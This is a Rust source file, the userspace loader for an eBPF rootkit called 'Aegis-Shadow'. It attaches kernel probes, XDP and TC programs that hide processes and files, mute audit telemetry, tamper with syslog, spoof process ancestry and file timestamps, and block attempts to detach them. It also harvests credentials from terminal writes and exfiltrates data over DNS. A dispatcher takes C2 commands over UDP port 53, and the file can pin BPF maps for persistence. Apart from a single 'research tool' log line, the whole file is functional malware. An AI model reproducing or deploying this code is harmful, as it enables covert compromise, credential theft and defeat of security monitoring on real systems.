use anyhow::{Context, Result};
use aya::{
    include_bytes_aligned,
    maps::{AsyncPerfEventArray, HashMap, MapData},
    programs::{
        tc::{SchedClassifier, TcAttachType},
        KProbe, TracePoint, Xdp, XdpFlags,
    },
    Btf, Ebpf,
};
use aya_log::EbpfLogger;
use bytes::BytesMut;
use clap::Parser;
use common::{
    CredentialCapture, EventHeader, RootkitConfig, TimestompEntry, BPF_PIN_PATH,
    EVENT_ANCESTRY_SPOOFED, EVENT_ANTI_DETACH, EVENT_C2_AUTH_FAILED, EVENT_DNS_EXFIL,
    EVENT_FILE_OBFUSCATED, EVENT_KALLSYMS_HIDDEN, EVENT_LOG_TAMPERED, EVENT_PACKET_INTERCEPTED,
    EVENT_PROC_HIDDEN, EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
};
use log::{debug, error, info, warn};
use offense::{parse_spoof_ppid, parse_timestomp, parse_tty_device};
use std::fs;
use std::path::Path;
use std::sync::{Arc, Mutex};
use tokio::signal;
use tokio::sync::watch;

#[derive(Debug, Parser)]
#[command(name = "aegis-shadow-offense")]
#[command(about = "Aegis-Shadow Offensive Rootkit Loader", long_about = None)]
struct Cli {
    /// Network interface to attach XDP program
    #[arg(short, long, default_value = "eth0")]
    iface: String,

    /// Enable verbose logging
    #[arg(short, long)]
    verbose: bool,

    /// Hide specific PID on startup
    #[arg(long)]
    hide_pid: Option<u32>,

    /// Obfuscate file by inode
    #[arg(long)]
    obfuscate_inode: Option<u64>,

    /// Monitor TTY device (major:minor format, e.g., 136:0)
    #[arg(long)]
    monitor_tty: Option<String>,

    /// Spoof PPID for target PID (format: pid:fake_ppid)
    #[arg(long)]
    spoof_ppid: Option<String>,

    /// Mark inode for timestomping (format: inode:atime:mtime:ctime)
    #[arg(long)]
    timestomp: Option<String>,

    /// Pin BPF maps to filesystem for persistence
    #[arg(long)]
    pin_maps: bool,
}

struct C2Maps {
    hidden_pids: Mutex<HashMap<MapData, u32, u8>>,
    obfuscate_inodes: Mutex<HashMap<MapData, u64, u8>>,
}

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();

    env_logger::Builder::from_env(
        env_logger::Env::default().default_filter_or(if cli.verbose { "debug" } else { "info" }),
    )
    .init();

    // Bump the memlock rlimit for eBPF
    let rlim = libc::rlimit {
        rlim_cur: libc::RLIM_INFINITY,
        rlim_max: libc::RLIM_INFINITY,
    };
    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
    if ret != 0 {
        warn!("Failed to increase RLIMIT_MEMLOCK");
    }

    info!("🔥 Aegis-Shadow Offensive Rootkit Starting...");
    info!("⚠️  WARNING: This is a research tool. Use responsibly and legally.");

    // Load eBPF bytecode
    #[cfg(debug_assertions)]
    let mut bpf = Ebpf::load(include_bytes_aligned!(
        "../../target/bpfel-unknown-none/debug/offense"
    ))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = Ebpf::load(include_bytes_aligned!(
        "../../target/bpfel-unknown-none/release/offense"
    ))?;

    // Load BTF if available
    if Btf::from_sys_fs().is_ok() {
        info!("✓ BTF loaded from /sys/kernel/btf/vmlinux");
    } else {
        warn!("⚠ BTF not available - CO-RE features may not work");
    }

    // Initialize BPF logger
    if let Err(e) = EbpfLogger::init(&mut bpf) {
        warn!("Failed to initialize eBPF logger: {}", e);
    }

    // Configure rootkit
    let self_pid = std::process::id();
    let config = RootkitConfig {
        self_pid,
        hide_procs: 1,
        net_stealth: 1,
        file_obfuscate: 1,
        mute_telemetry: 1,
        _pad: [0u8; 4],
    };

    let mut config_map: HashMap<_, u32, RootkitConfig> =
        HashMap::try_from(bpf.map_mut("CONFIG").context("CONFIG map not found")?)?;
    config_map.insert(0u32, config, 0)?;
    info!("✓ Rootkit configured (self_pid={})", self_pid);

    // Pin maps if requested
    if cli.pin_maps {
        pin_all_maps(&mut bpf)?;
        info!("✓ Maps pinned to {}", BPF_PIN_PATH);
    }

    // Load Feature 1: Process Hiding (getdents64)
    let getdents_enter: &mut KProbe = bpf
        .program_mut("shadow_getdents64_enter")
        .context("shadow_getdents64_enter not found")?
        .try_into()?;
    getdents_enter.load()?;
    getdents_enter.attach("__x64_sys_getdents64", 0)?;

    let getdents_exit: &mut KProbe = bpf
        .program_mut("shadow_getdents64_exit")
        .context("shadow_getdents64_exit not found")?
        .try_into()?;
    getdents_exit.load()?;
    getdents_exit.attach("__x64_sys_getdents64", 0)?;
    info!("✓ Feature 1: Process Hiding (getdents64) loaded");

    // Load Feature 2: Network Stealth (XDP)
    let xdp_prog: &mut Xdp = bpf
        .program_mut("shadow_xdp")
        .context("shadow_xdp not found")?
        .try_into()?;
    xdp_prog.load()?;
    xdp_prog.attach(&cli.iface, XdpFlags::default())?;
    info!(
        "✓ Feature 2: Network Stealth (XDP) attached to {}",
        cli.iface
    );

    // Load Feature 3: File Obfuscation (vfs_read)
    let vfs_read: &mut KProbe = bpf
        .program_mut("shadow_vfs_read")
        .context("shadow_vfs_read not found")?
        .try_into()?;
    vfs_read.load()?;
    vfs_read.attach("vfs_read", 0)?;
    info!("✓ Feature 3: File Obfuscation (vfs_read) loaded");

    // Load Feature 4: Telemetry Muting (audit hooks)
    let audit_syscall: &mut KProbe = bpf
        .program_mut("shadow_mute_audit")
        .context("shadow_mute_audit not found")?
        .try_into()?;
    audit_syscall.load()?;
    if let Err(e) = audit_syscall.attach("audit_log_start", 0) {
        warn!(
            "⚠ Failed to attach audit_log_start: {} (audit may not be enabled)",
            e
        );
    } else {
        info!("✓ Feature 4: Telemetry Muting (audit) loaded");
    }

    let audit_log_end: &mut KProbe = bpf
        .program_mut("shadow_mute_audit_log_end")
        .context("shadow_mute_audit_log_end not found")?
        .try_into()?;
    audit_log_end.load()?;
    if let Err(e) = audit_log_end.attach("audit_log_end", 0) {
        warn!("⚠ Failed to attach audit_log_end: {}", e);
    }

    // Load Feature 6: Credential Harvesting (sys_write on TTY)
    let cred_harvest: &mut KProbe = bpf
        .program_mut("shadow_cred_harvest")
        .context("shadow_cred_harvest not found")?
        .try_into()?;
    cred_harvest.load()?;
    cred_harvest.attach("ksys_write", 0)?;
    info!("✓ Feature 6: Credential Harvesting (ksys_write) loaded");

    // Load Feature 7: Log Tampering (do_syslog)
    let log_tamper_enter: &mut KProbe = bpf
        .program_mut("shadow_tamper_logs_enter")
        .context("shadow_tamper_logs_enter not found")?
        .try_into()?;
    log_tamper_enter.load()?;
    log_tamper_enter.attach("do_syslog", 0)?;

    let log_tamper_exit: &mut KProbe = bpf
        .program_mut("shadow_tamper_logs")
        .context("shadow_tamper_logs not found")?
        .try_into()?;
    log_tamper_exit.load()?;
    log_tamper_exit.attach("do_syslog", 0)?;
    info!("✓ Feature 7: Log Tampering (do_syslog) loaded");

    // Load Feature 8: Process Ancestry Spoofing (vfs_read on /proc/[pid]/status)
    let spoof_ancestry: &mut KProbe = bpf
        .program_mut("shadow_spoof_ancestry")
        .context("shadow_spoof_ancestry not found")?
        .try_into()?;
    spoof_ancestry.load()?;
    spoof_ancestry.attach("vfs_read", 0)?;
    info!("✓ Feature 8: Process Ancestry Spoofing (vfs_read) loaded");

    // Load Feature 9: DNS Exfiltration (TC egress)
    let tc_prog: &mut SchedClassifier = bpf
        .program_mut("shadow_dns_exfil")
        .context("shadow_dns_exfil not found")?
        .try_into()?;
    tc_prog.load()?;
    tc_prog.attach(&cli.iface, TcAttachType::Egress)?;
    info!(
        "✓ Feature 9: DNS Exfiltration (TC egress) attached to {}",
        cli.iface
    );

    // Load Feature 10: Kallsyms Hiding (vfs_read on /proc/kallsyms)
    let hide_kallsyms: &mut KProbe = bpf
        .program_mut("shadow_hide_kallsyms")
        .context("shadow_hide_kallsyms not found")?
        .try_into()?;
    hide_kallsyms.load()?;
    hide_kallsyms.attach("vfs_read", 0)?;
    info!("✓ Feature 10: Kallsyms Hiding (vfs_read) loaded");

    // Load Feature 11: Anti-Detach Self-Defense (bpf tracepoint)
    let anti_detach: &mut TracePoint = bpf
        .program_mut("shadow_anti_detach")
        .context("shadow_anti_detach not found")?
        .try_into()?;
    anti_detach.load()?;
    anti_detach.attach("syscalls", "sys_enter_bpf")?;
    info!("✓ Feature 11: Anti-Detach Self-Defense (tracepoint) loaded");

    // Load Feature 13: Timestomping (vfs_getattr)
    let timestomp_enter: &mut KProbe = bpf
        .program_mut("shadow_timestomp_enter")
        .context("shadow_timestomp_enter not found")?
        .try_into()?;
    timestomp_enter.load()?;
    timestomp_enter.attach("vfs_getattr", 0)?;

    let timestomp_exit: &mut KProbe = bpf
        .program_mut("shadow_timestomp")
        .context("shadow_timestomp not found")?
        .try_into()?;
    timestomp_exit.load()?;
    timestomp_exit.attach("vfs_getattr", 0)?;
    info!("✓ Feature 13: Timestomping (vfs_getattr) loaded");

    // Apply CLI configurations
    if let Some(pid) = cli.hide_pid {
        let mut hidden_pids: HashMap<_, u32, u8> = HashMap::try_from(
            bpf.map_mut("HIDDEN_PIDS")
                .context("HIDDEN_PIDS not found")?,
        )?;
        hidden_pids.insert(pid, 1u8, 0)?;
        info!("✓ Hiding PID: {}", pid);
    }

    if let Some(inode) = cli.obfuscate_inode {
        let mut obfuscate_inodes: HashMap<_, u64, u8> = HashMap::try_from(
            bpf.map_mut("OBFUSCATE_INODES")
                .context("OBFUSCATE_INODES not found")?,
        )?;
        obfuscate_inodes.insert(inode, 1u8, 0)?;
        info!("✓ Obfuscating inode: {}", inode);
    }

    if let Some(tty) = cli.monitor_tty {
        if let Some((major, minor)) = parse_tty_device(&tty) {
            let dev_key = ((major as u64) << 32) | (minor as u64);
            let mut monitored_ttys: HashMap<_, u64, u8> = HashMap::try_from(
                bpf.map_mut("MONITORED_TTYS")
                    .context("MONITORED_TTYS not found")?,
            )?;
            monitored_ttys.insert(dev_key, 1u8, 0)?;
            info!("✓ Monitoring TTY: {} ({}:{})", tty, major, minor);
        } else {
            warn!("⚠ Invalid TTY format: {}", tty);
        }
    }

    if let Some(spoof) = cli.spoof_ppid {
        if let Some((pid, fake_ppid)) = parse_spoof_ppid(&spoof) {
            let mut spoofed_ppids: HashMap<_, u32, u32> = HashMap::try_from(
                bpf.map_mut("SPOOFED_PPIDS")
                    .context("SPOOFED_PPIDS not found")?,
            )?;
            spoofed_ppids.insert(pid, fake_ppid, 0)?;
            info!("✓ Spoofing PPID: {} → {}", pid, fake_ppid);
        } else {
            warn!("⚠ Invalid spoof format: {}", spoof);
        }
    }

    if let Some(ts) = cli.timestomp {
        if let Some((inode, entry)) = parse_timestomp(&ts) {
            let mut timestomp_inodes: HashMap<_, u64, TimestompEntry> = HashMap::try_from(
                bpf.map_mut("TIMESTOMP_INODES")
                    .context("TIMESTOMP_INODES not found")?,
            )?;
            timestomp_inodes.insert(inode, entry, 0)?;
            info!("✓ Timestomping inode: {}", inode);
        } else {
            warn!("⚠ Invalid timestomp format: {}", ts);
        }
    }

    // Extract maps for C2 command dispatch before moving bpf
    let hidden_pids_map = bpf
        .take_map("HIDDEN_PIDS")
        .context("HIDDEN_PIDS not found")?;
    let obfuscate_inodes_map = bpf
        .take_map("OBFUSCATE_INODES")
        .context("OBFUSCATE_INODES not found")?;

    let c2_maps = Arc::new(C2Maps {
        hidden_pids: Mutex::new(HashMap::try_from(hidden_pids_map)?),
        obfuscate_inodes: Mutex::new(HashMap::try_from(obfuscate_inodes_map)?),
    });

    let (kill_tx, mut kill_rx) = watch::channel(false);

    // Start event monitoring with C2 dispatch
    tokio::spawn(monitor_events(bpf, Arc::clone(&c2_maps), kill_tx));

    info!("🚀 Rootkit active. Press Ctrl+C to detach and exit.");
    info!("📡 Listening for C2 commands on UDP port 53...");

    tokio::select! {
        _ = signal::ctrl_c() => {
            info!("🛑 Shutting down (Ctrl+C)...");
        }
        _ = async { while !*kill_rx.borrow_and_update() { kill_rx.changed().await.ok(); } } => {
            info!("🛑 Kill switch activated via C2. Shutting down...");
        }
    }

    Ok(())
}

fn pin_all_maps(bpf: &mut Ebpf) -> Result<()> {
    let pin_path = Path::new(BPF_PIN_PATH);
    if !pin_path.exists() {
        fs::create_dir_all(pin_path)?;
    }

    for (name, map) in bpf.maps_mut() {
        let map_path = pin_path.join(name);
        if let Err(e) = map.pin(&map_path) {
            warn!("Failed to pin map {}: {}", name, e);
        }
    }

    Ok(())
}

async fn monitor_events(mut bpf: Ebpf, c2_maps: Arc<C2Maps>, kill_tx: watch::Sender<bool>) {
    let events_map = match bpf.take_map("EVENTS") {
        Some(map) => map,
        None => {
            error!("Failed to get EVENTS map");
            return;
        }
    };
    let mut events: AsyncPerfEventArray<_> = match AsyncPerfEventArray::try_from(events_map) {
        Ok(perf) => perf,
        Err(e) => {
            error!("Failed to get EVENTS perf array: {}", e);
            return;
        }
    };

    let cred_map = match bpf.take_map("CRED_EVENTS") {
        Some(map) => map,
        None => {
            error!("Failed to get CRED_EVENTS map");
            return;
        }
    };
    let mut cred_events: AsyncPerfEventArray<_> = match AsyncPerfEventArray::try_from(cred_map) {
        Ok(perf) => perf,
        Err(e) => {
            error!("Failed to get CRED_EVENTS perf array: {}", e);
            return;
        }
    };

    let cpus = aya::util::online_cpus().unwrap_or_else(|_| vec![0]);
    info!("Event monitoring started on {} CPUs", cpus.len());

    for cpu in cpus.iter() {
        if let Ok(buf) = events.open(*cpu, None) {
            let maps = Arc::clone(&c2_maps);
            let kill = kill_tx.clone();
            tokio::spawn(async move {
                process_event_buf(buf, maps, kill).await;
            });
        }
        if let Ok(buf) = cred_events.open(*cpu, None) {
            tokio::spawn(async move {
                process_cred_buf(buf).await;
            });
        }
    }
}

async fn process_event_buf(
    mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<aya::maps::MapData>,
    c2_maps: Arc<C2Maps>,
    kill_tx: watch::Sender<bool>,
) {
    let mut bufs = (0..10)
        .map(|_| BytesMut::with_capacity(1024))
        .collect::<Vec<_>>();
    loop {
        let events = match buf.read_events(&mut bufs).await {
            Ok(events) => events,
            Err(e) => {
                error!("Error reading events: {}", e);
                return;
            }
        };
        for buf in bufs.iter().take(events.read) {
            if buf.len() >= std::mem::size_of::<EventHeader>() {
                let event = unsafe { std::ptr::read_unaligned(buf.as_ptr() as *const EventHeader) };
                if event.event_type == EVENT_PACKET_INTERCEPTED {
                    let cmd_type = event.pid;
                    let arg = event.context;
                    dispatch_c2_command(cmd_type, arg, &c2_maps, &kill_tx);
                } else {
                    log_event(&event);
                }
            }
        }
    }
}

async fn process_cred_buf(mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<aya::maps::MapData>) {
    let mut bufs = (0..10)
        .map(|_| BytesMut::with_capacity(1024))
        .collect::<Vec<_>>();
    loop {
        let events = match buf.read_events(&mut bufs).await {
            Ok(events) => events,
            Err(e) => {
                error!("Error reading cred events: {}", e);
                return;
            }
        };
        for buf in bufs.iter().take(events.read) {
            if buf.len() >= std::mem::size_of::<CredentialCapture>() {
                let capture =
                    unsafe { std::ptr::read_unaligned(buf.as_ptr() as *const CredentialCapture) };
                log_credential_capture(&capture);
            }
        }
    }
}

fn dispatch_c2_command(cmd_type: u32, arg: u64, c2_maps: &C2Maps, kill_tx: &watch::Sender<bool>) {
    match cmd_type {
        1 => {
            let pid = arg as u32;
            match c2_maps.hidden_pids.lock() {
                Ok(mut map) => match map.insert(pid, 1u8, 0) {
                    Ok(_) => info!("C2: hide_pid {}", pid),
                    Err(e) => error!("C2: failed to hide PID {}: {}", pid, e),
                },
                Err(e) => error!("C2: lock error: {}", e),
            }
        }
        2 => {
            let pid = arg as u32;
            match c2_maps.hidden_pids.lock() {
                Ok(mut map) => match map.remove(&pid) {
                    Ok(_) => info!("C2: unhide_pid {}", pid),
                    Err(e) => warn!("C2: unhide PID {} (not found or error): {}", pid, e),
                },
                Err(e) => error!("C2: lock error: {}", e),
            }
        }
        3 => match c2_maps.obfuscate_inodes.lock() {
            Ok(mut map) => match map.insert(arg, 1u8, 0) {
                Ok(_) => info!("C2: obfuscate_file inode={}", arg),
                Err(e) => error!("C2: failed to obfuscate inode {}: {}", arg, e),
            },
            Err(e) => error!("C2: lock error: {}", e),
        },
        4 => {
            debug!("C2: exfil request target={}", arg);
        }
        5 => {
            warn!("C2: kill_switch received, initiating shutdown");
            let _ = kill_tx.send(true);
        }
        _ => {
            warn!("C2: unknown command type={}, arg={}", cmd_type, arg);
        }
    }
}

fn log_event(event: &EventHeader) {
    match event.event_type {
        EVENT_PROC_HIDDEN => {
            debug!("Process hidden: PID={}", event.pid);
        }
        EVENT_FILE_OBFUSCATED => {
            debug!(
                "File obfuscated: PID={}, inode={}",
                event.pid, event.context
            );
        }
        EVENT_LOG_TAMPERED => {
            debug!("Log tampered: PID={}, bytes={}", event.pid, event.context);
        }
        EVENT_ANCESTRY_SPOOFED => {
            debug!(
                "Ancestry spoofed: PID={}, fake_ppid={}",
                event.pid, event.context
            );
        }
        EVENT_DNS_EXFIL => {
            debug!("DNS exfiltration: seq={}", event.context);
        }
        EVENT_KALLSYMS_HIDDEN => {
            debug!(
                "Kallsyms hidden: PID={}, inode={}",
                event.pid, event.context
            );
        }
        EVENT_ANTI_DETACH => {
            debug!(
                "Detach attempt blocked: PID={}, cmd={}",
                event.pid, event.context
            );
        }
        EVENT_TIMESTOMPED => {
            debug!(
                "Timestamp spoofed: PID={}, inode={}",
                event.pid, event.context
            );
        }
        EVENT_C2_AUTH_FAILED => {
            warn!("C2 authentication failed: encrypted={}", event.context);
        }
        EVENT_TELEMETRY_MUTED => {
            debug!("Telemetry muted: PID={}", event.pid);
        }
        _ => {
            debug!("Unknown event: type={}", event.event_type);
        }
    }
}

fn log_credential_capture(capture: &CredentialCapture) {
    let data_str = String::from_utf8_lossy(&capture.data[..capture.data_len as usize]);
    info!(
        "Credential captured: PID={}, FD={}, data={:?}",
        capture.pid, capture.fd, data_str
    );
}
